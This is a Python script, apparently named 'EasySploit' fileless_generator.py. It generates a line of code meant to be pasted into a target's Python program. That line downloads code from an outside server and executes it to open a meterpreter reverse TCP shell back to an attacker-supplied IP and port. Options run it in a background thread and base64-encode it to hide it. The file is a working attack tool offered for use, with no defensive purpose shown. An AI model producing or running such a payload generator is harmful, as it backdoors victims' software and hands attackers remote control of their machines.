import argparse
import base64

HELP_MESSAGE = """

███████╗ █████╗ ███████╗██╗   ██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
█████╗  ███████║███████╗ ╚████╔╝ ███████╗██████╔╝██║     ██║   ██║██║   ██║   
██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████╗██║  ██║███████║   ██║   ███████║██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                              

This script generates a fileless payload that can be used to execute a meterpreter reverse_tcp payload on a target machine.
The generated code should be pasted in the target python code.

Usage:
python3 fileless_generator.py <IP> <PORT> [-a] [-t] [-e] [-o <OUTPUT FILE>]
python3 fileless_generator.py <IP> <PORT> [--admin] [--threading] [--encoding] [--output <OUTPUT FILE>]
"""

"""
Arguments:
<IP>: IP address of the attacker machine.
<PORT>: Port number to listen on.
-a or --admin: Include admin feature code.
-t or --threading: Include threading code.
-e or --encoding: Include base64 encoding.
-o or --output: Output file to save the code.
-h or --help: Show this help message.
"""

parser = argparse.ArgumentParser(description=HELP_MESSAGE, formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)
parser.add_argument('ip', type=str, help='IP address')
parser.add_argument('port', type=int, help='Port number')
parser.add_argument('-a', '--admin', action='store_true', help='Include admin path')
parser.add_argument('-t', '--threading', action='store_true', help='Include threading')
parser.add_argument('-e', '--encoding', action='store_true', help='Include base64 encoding')
parser.add_argument('-o', '--output', type=str, help='Output file to save the code')
parser.add_argument('-h', '--help', action='help', help='Show this help message')

args = parser.parse_args()

admin_path = "/admin" if args.admin else ""
command = ""
command += "import urllib.request, json\n"
if args.threading:
    command += "import threading\nthreading.Thread(target=lambda: "
command += f"""exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp{admin_path}", data=json.dumps({{"LHOST": "{args.ip}", "LPORT": {args.port}}}).encode(), headers={{'Content-Type': 'application/json'}})).read().decode())"""

if args.threading:
    command += ").start()"

if args.encoding:
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
    command = f"exec(__import__('base64').b64decode('{encoded_command}').decode('utf-8'))"

if args.output:
    with open(args.output, 'w') as f:
        f.write(command)
else:
    print("Copy the following code and paste it in the target python code:")
    print("================================================================")
    print(command)